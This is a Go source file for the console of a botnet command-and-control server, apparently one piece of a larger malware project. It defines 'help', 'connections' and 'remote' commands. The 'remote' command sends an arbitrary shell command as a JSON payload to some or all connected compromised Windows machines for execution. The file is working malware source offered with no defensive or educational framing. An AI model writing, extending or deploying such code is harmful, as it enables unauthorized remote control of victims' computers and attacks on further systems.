package repl

import (
	. "botnet/server/net"
	. "botnet/server/util"
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"strings"

	"github.com/gookit/color"
)

type Command struct {
	Name string
	Description string
	Parameters map[string]string
	Handler func(map[string]interface{})
}

var Commands []Command

func init() {
	Commands = []Command{
		{
			Name: "help",
			Description: "Get a list of commands and how to use them.",
			Handler: printHelp,
			Parameters: make(map[string]string),
		},
		{
			Name: "connections",
			Description: "Get the amount of online and offline connections.",
			Handler: printConnections,
			Parameters: make(map[string]string),
		},
		{
			Name: "remote",
			Description: "Remotely execute a command on a target windows machine. Specify the amount of instances to execute the command on.",
			Handler: remoteExec,
			Parameters: map[string]string{ "instances": "number?", "command": "string" },
		},
	}
}

func printHelp(_ map[string]interface{}) {
	for _, command := range Commands {
		color.Bold.Print(command.Name)
		for parameterName, parameterType := range command.Parameters {
			color.Bold.Printf(" %s=%s", parameterName, parameterType)
		}

		fmt.Println(" - " + command.Description)
	}
}

func printConnections(parameters map[string]interface{}) {
	fmt.Printf("There are currently %d/%d online connections.\n", OnlineConnectionCount(), len(Connections))
}

func remoteExec(parameters map[string]interface{}) {
	command := parameters["command"].(string)
	instances, ok := parameters["instances"].(int)
	if !ok { instances = len(Connections) }

	successCount := 0

	for _, conn := range Connections {
		if successCount == instances { break }
		if conn == nil { continue }

		payload := RemoteExecPayload{Payload: Payload{Type: RemoteExecPayloadType}, Command: command}
		payloadBuffer, _ := json.Marshal(payload)

		err := Write(*conn, string(payloadBuffer))
		if err != nil { continue }

		successCount += 1
	}

	Info("Successfully executed command on %d instances.", successCount)
}

func StartRepl() {
	scanner := bufio.NewScanner(os.Stdin)

	for {
		fmt.Print("> ")
		scanner.Scan()
		input := scanner.Text()

		select {
			case <-LogChannel: // If there is a log, we want to re-take the input
				continue
			default:
				ParseCommand(strings.ToLower(input))
		}
	}
}